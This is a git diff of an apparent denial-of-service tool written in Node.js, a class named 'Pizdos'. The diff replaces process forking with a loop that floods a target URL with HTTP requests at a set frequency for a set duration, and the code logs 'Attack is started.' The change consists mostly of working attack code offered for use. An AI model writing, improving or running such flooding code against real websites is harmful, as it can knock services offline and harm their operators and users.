@@ -1,6 +1,7 @@
 // ---------------------------- Imports. ---------------------------------
-const fs = require('fs'),
-      cp = require('child_process')
+const fs      = require('fs'),
+      cp      = require('child_process'),
+      request = require('request')
 
 // --------------------------- Main class. -------------------------------
 class Pizdos {
@@ -18,10 +19,9 @@ class Pizdos {
             
             const o = Object.assign(JSON.parse(data), options)
 
-            this.startAttackProcesses(url,
-                                      o.processesCount,
-                                      o.attackDuration,
-                                      o.requestsFrequency)
+            this.startAttack(url,
+                             o.attackDuration,
+                             o.requestsFrequency)
         })
     }
 
@@ -33,12 +33,22 @@ class Pizdos {
      * @param {number} duration 
      * @param {number} frequency 
      */
-    static startAttackProcesses(url, processesCount, duration, frequency) {
+    static startAttack(url, duration, frequency) {
         console.log('Attack is started.')
-        for (let i = 1; i <= processesCount; i++) {
-            cp.fork(__dirname + '/dos_worker', [url, duration, frequency, i])
-            console.log(`${i} process is started.`)
-        }
+
+        setInterval(() => {
+            request(url, (error, r, b) => {
+                if (!!error) {
+                    console.log('Attack ended with an error.')
+                    process.abort()
+                }
+            })
+        }, frequency)
+
+        setTimeout(() => {
+            console.log('Attack is complete.')
+            process.abort()
+        }, duration)
     }
 }
 
